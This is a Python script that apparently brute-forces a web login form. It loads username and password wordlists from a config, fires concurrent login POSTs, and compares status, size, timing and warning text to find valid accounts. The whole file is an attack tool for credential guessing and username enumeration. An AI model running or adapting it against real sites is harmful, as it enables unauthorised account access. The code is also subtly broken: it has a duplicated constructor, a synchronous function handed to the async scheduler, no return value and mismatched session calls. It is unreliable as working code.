#!/usr/bin/python3.7
from concurrent.futures import ThreadPoolExecutor
from timeit import default_timer
from requests import Session
from sys import getsizeof
from enum import Enum
from lxml import html
from aiohttp import ClientSession
import requests
import asyncio
import json

class Cycler(Enum):
    USERNAME = 1
    PASSWORDS = 2

class Result:
    status: int
    size: int
    warning: str
    time: float
    username: str
    password: str

    def __init__(self, status, size, warning, time, username, password):
        self.status = status
        self.size = size
        self.warning = warning
        self.time = time
        self.username = username
        self.password = password

    def __repr__(self):
        return '{' + \
            str(self.status) + ', ' + \
            str(self.size) + ', ' + \
            str(self.warning) + ', ' + \
            str(self.time) + ', ' + \
            self.username + ', ' + \
            self.password + \
            '}'

class Config:
    url: str
    cookies: str
    usernames_path: str
    passwords_path: str
    headers: dict

    def __init__(self, url, cookies, usernames_path, passwords_path, headers):
        self.url = url
        self.cookies = cookies
        self.usernames_path = usernames_path
        self.passwords_path = passwords_path
        self.headers = headers

    def __init__(self, conf: dict):
        self.url = conf.get("url")
        self.cookies = conf.get("cookies")
        self.usernames_path = conf.get("usernames_path")
        self.passwords_path = conf.get("passwords_path")
        self.headers = conf.get("headers")

    def __repr__(self):
        return '{' + \
            self.url + ', ' + \
            self.cookies + ', ' + \
            self.usernames_path + ', ' + \
            self.passwords_path + ', ' + \
            str(self.headers) + \
            '}'


def get_config():
    config_file = open("./config.json", "r")
    json_data = json.load(config_file)
    config_file.close()
    return json_data

def load_entries(file_name):
    result = []
    with open(file_name, "r") as file:
        for line in file:
            result.append(line.rstrip())
    return result

def login(session, config: Config, cycler: Cycler, arr_item: str, set_word: str, idx: int):
    data = {}
    if cycler == Cycler.USERNAME:
        data = {
            'username': arr_item,
            'password': set_word
        }
    else:
        data = {
            'username': set_word,
            'password': arr_item
        }
    r = session.post(
            config.url,
            cookies = config.cookies,
            data = data
        )
    tree = html.fromstring(r.content)
    warning = tree.xpath('//p[@class="is-warning"]/text()')
    result = Result(r.status_code, getsizeof(r.content), warning, r.elapsed.total_seconds(), arr_item, set_word)

async def login_async(config: Config, cycler: Cycler, arr: list, set_word: str):
    tasks = []
    async with ClientSession() as session:
        for idx, arr_item in enumerate(arr):
            task = asyncio.ensure_future(login(session, config, cycler, arr_item, set_word, idx))
            tasks.append(task)

        responses = await asyncio.gather(*tasks)
        print(responses)
    # with ThreadPoolExecutor(max_workers=100) as executor:
    #     with requests.Session() as session:
    #         loop = asyncio.get_event_loop()
    #         tasks = [
    #             loop.run_in_executor(
    #                 executor,
    #                 login,
    #                 *(session, config, cycler, arr_item, set_word, idx) # Allows us to pass in multiple arguments to `fetch`
    #             )
    #             for idx, arr_item in enumerate(arr)
    #         ]
    #         # for response in await asyncio.gather(*tasks):
    #         #     print(response)

def sambure():
    config = Config(get_config())
    usernames = load_entries(config.usernames_path)
    passwords = load_entries(config.passwords_path)

    start_time = default_timer()
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(login_async(config, Cycler.USERNAME, usernames, "a"))
    loop.run_until_complete(future)
    print(f"Final time {default_timer() - start_time}")

if __name__ == "__main__":
    sambure()